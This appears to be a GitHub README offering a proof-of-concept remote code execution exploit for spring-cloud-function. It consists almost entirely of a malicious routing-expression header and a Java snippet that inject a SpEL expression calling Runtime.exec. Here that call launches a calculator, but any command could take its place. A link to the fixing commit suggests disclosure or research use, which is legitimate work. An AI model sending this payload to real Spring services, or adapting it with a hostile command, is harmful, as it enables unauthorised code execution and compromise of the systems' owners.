# spring-spel-0day-poc
spring-cloud/spring-cloud-function RCE EXP POC
https://github.com/spring-cloud/spring-cloud-function
header
```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
```
## Poc
```java
Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);
Message<String> message = MessageBuilder.withPayload("hello")
 				.setHeader(FunctionProperties.PREFIX + ".routing-expression",
 						"T(java.lang.Runtime).getRuntime().exec(\"open -a calculator.app\")")
 				.build();
function.apply(message);
```

<!--
https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
-->
